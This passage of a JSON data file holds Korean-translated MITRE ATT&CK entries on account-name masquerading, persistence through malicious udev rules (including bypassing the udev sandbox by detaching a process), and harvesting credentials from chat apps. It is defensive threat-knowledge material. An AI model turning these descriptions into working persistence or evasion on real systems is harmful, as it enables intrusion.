    "description": "적대자는 새로 생성된 계정이 정상으로 보이도록 하기 위해 합법적인 계정의 이름을 일치시키거나 유사하게 만들 수 있습니다. 이는 일반적으로 계정 생성 중에 발생하지만, 계정은 나중에 이름이 변경될 수도 있습니다. 또한 이 과정은 먼저 계정을 삭제한 다음 동일한 이름으로 다시 생성하는 경우 계정 접근 제거와 일치할 수 있습니다.\n\n자주 적대자는 합법적인 소프트웨어, 데이터 백업 또는 컨테이너 클러스터 관리와 관련된 서비스 계정으로 가장하려고 시도합니다. 그들은 \"admin\", \"help\" 또는 \"root\"와 같이 일반적이고 신뢰할 수 있는 이름을 계정에 부여할 수도 있습니다. 때때로 적대자는 시스템에 이미 존재하는 계정 이름을 기반으로 계정 이름을 모델링하기도 합니다.\n\n이는 특정 신뢰할 수 있는 개인이나 조직을 가장하는 것과는 구별되며, 사용자의 계정 이름이나 서비스 계정 이름을 대상에 두고 있음을 유념해야 합니다.",
    "external_id": "T1036.010",
    "modified": "2024-10-17T15:20:36.705Z",
    "translated": true
  },
  {
    "title": "Udev Rules",
    "description": "적대자는 udev 규칙을 사용하여 트리거된 악성 콘텐츠를 실행함으로써 지속성을 유지할 수 있습니다. Udev는 장치 노드를 동적으로 관리하고, `/dev` 디렉토리에서 의사 장치 파일에 대한 접근을 처리하며, 하드 드라이브나 키보드와 같은 외부 장치가 연결되거나 제거될 때와 같은 하드웨어 이벤트에 응답하는 리눅스 커널 장치 관리자입니다. Udev는 하드웨어 이벤트가 충족해야 하는 조건을 지정하기 위한 `match keys`와 뒤따라야 할 동작을 정의하기 위한 `action keys`가 포함된 규칙 파일을 사용합니다. `/etc/udev/rules.d/`, `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`, `/lib/udev/rules.d/`에 위치한 규칙 파일을 생성, 수정 또는 삭제하려면 루트 권한이 필요합니다. 규칙의 우선 순위는 디렉토리와 규칙 파일 이름의 숫자 접두사에 의해 결정됩니다.\n\n적대자는 udev 규칙 파일에서 규칙을 추가하거나 수정하여 udev 하위 시스템을 악용할 수 있습니다. 예를 들어, 적대자는 애플리케이션이 `/dev/random`과 같은 의사 장치 파일에 접근할 때마다 자신의 이진 파일을 실행하도록 규칙을 구성할 수 있습니다. udev는 짧은 작업만 실행할 수 있으며, systemd-udevd의 샌드박스(네트워크 및 파일 시스템 접근 차단)에 의해 제한되지만, 공격자는 액션 키 `RUN+=` 아래에서 스크립트 명령을 사용하여 악성 콘텐츠의 프로세스를 분리하여 백그라운드에서 실행하여 이러한 통제를 우회할 수 있습니다.",
    "external_id": "T1546.017",
    "modified": "2024-11-11T19:05:38.708Z",
    "translated": true
  },
  {
    "title": "Messaging Applications",
    "description": "적대자는 Microsoft Teams, Google Chat, Slack과 같은 채팅 및 메시징 애플리케이션을 활용하여 가치 있는 정보를 수집할 수 있습니다.\n\n다음은 적대자에게 잠재적 가치를 지닐 수 있는 정보의 간략한 목록이며, 메시징 애플리케이션에서도 발견될 수 있습니다:\n\n* 테스트 / 개발 자격 증명 \n* 소스 코드 조각 \n* 네트워크 공유 및 기타 내부 리소스에 대한 링크 \n* 독점 데이터 \n* 진행 중인 사건 대응 노력에 대한 논의 \n\n메시징 애플리케이션에서 데이터를 추출하는 것 외에도, 적대자는 채팅 메시지의 데이터를 활용하여 목표 설정을 개선할 수 있습니다. 예를 들어, 환경에 대해 더 많이 배우거나 진행 중인 사건 대응 노력을 피하는 방식으로 활용될 수 있습니다.",
    "external_id": "T1213.005",
    "modified": "2024-10-16T14:22:49.146Z",
    "translated": true
  }
]